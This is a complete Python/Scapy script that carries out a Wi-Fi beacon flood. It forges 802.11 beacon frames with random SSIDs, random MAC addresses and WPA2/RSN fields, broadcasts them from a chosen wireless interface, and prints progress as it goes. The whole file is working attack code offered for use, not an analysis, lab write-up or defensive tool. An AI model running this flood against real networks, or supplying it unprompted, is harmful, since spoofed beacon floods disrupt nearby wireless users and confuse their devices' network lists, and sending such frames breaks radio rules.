from scapy.all import *
import random
import string
import time

def random_ssid(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_beacon(ssid, mac):
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'                 # RSN Version 1
        '\x00\x0f\xac\x02'         # Group Cipher Suite : TKIP
        '\x02\x00'                 # 2 Pairwise Cipher Suites (next two lines)
        '\x00\x0f\xac\x04'         # AES Cipher
        '\x00\x0f\xac\x02'         # TKIP Cipher
        '\x01\x00'                 # 1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'         # Pre-Shared Key
        '\x00\x00'))               # RSN Capabilities
    frame = RadioTap()/dot11/beacon/essid/rsn
    return frame

def beacon_flood(interface, count=100):
    print(f"[*] Starting beacon flood on {interface}...")
    print("[*] Press Ctrl+C to stop...")
    try:
        i = 0
        while i < count:
            ssid = random_ssid()
            mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255))
            frame = create_beacon(ssid, mac)
            sendp(frame, iface=interface, verbose=0)
            print(f"Sent beacon for SSID: {ssid} with MAC: {mac}")
            time.sleep(0.1)
            i += 1
    except KeyboardInterrupt:
        print("\n[*] Stopping beacon flood...")
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <interface>")
        exit(1)
    iface = sys.argv[1]
    beacon_flood(iface)